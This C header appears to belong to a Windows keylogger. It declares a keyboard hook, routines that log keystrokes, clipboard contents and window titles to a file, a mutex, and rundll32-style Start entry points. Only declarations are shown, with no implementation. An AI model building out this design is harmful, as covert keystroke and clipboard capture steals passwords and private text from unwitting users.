#pragma once
#ifndef __SVKL_HEADER__
#define __SVKL_HEADER__

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include "debug.h"


#define MemAlloc(n,f) HeapAlloc(GetProcessHeap(), (f), (n))
#define MemFree(p) ( (p) != NULL ? HeapFree(GetProcessHeap(), 0, (p)) : TRUE )

#define MUTEX_NAME  		TEXT("SvklMux")
#define WINDOW_CLASSNAME  	TEXT("WndClsSvkl")
#define WM_EVENT_CHAR  		WM_APP + 1
#define WM_EVENT_GETTEXT  	WM_APP + 2

BOOL CreateLog(LPTSTR lpszFileName);
VOID CloseLog(VOID);
LRESULT CALLBACK HookProc(int code, WPARAM wParam, LPARAM lParam);
VOID HookRemove(VOID);
BOOL HookSet(VOID);
void CALLBACK Start(HWND hWnd, HINSTANCE hInstance, LPTSTR lpszCmdLine, int nCmdShow);
void CALLBACK StartA(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int nCmdShow);
void CALLBACK StartW(HWND hWnd, HINSTANCE hInstance, LPWSTR lpszCmdLine, int nCmdShow);
BOOL WndCreate(BOOL bClipboard);
LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
inline VOID WriteChar(WPARAM wParam, LPARAM lParam);
inline VOID WriteClipboard(VOID);
VOID WriteEvent(LPSTR lpszEvent, LPWSTR lpszData);
BOOL WriteLog(PBYTE pData, DWORD cbData);
VOID WriteWnd(BOOL bForce);

#endif//__SVKL_HEADER__
